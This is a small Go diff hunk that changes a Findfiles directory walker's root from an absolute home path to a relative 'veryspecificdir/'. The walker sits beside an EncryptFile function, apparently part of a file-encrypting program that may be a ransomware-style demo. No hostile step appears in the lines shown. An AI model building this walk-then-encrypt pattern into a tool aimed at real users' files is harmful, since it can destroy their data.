@@ -96,7 +96,7 @@ func EncryptFile(file string) {
 
 func Findfiles() []string {
 	var files []string
-	root := "/home/veryspecificdir/"
+	root := "veryspecificdir/"
 	filepath.Walk(root, func(path string, info os.FileInfo, err error) error {
 		if err != nil {
 		}
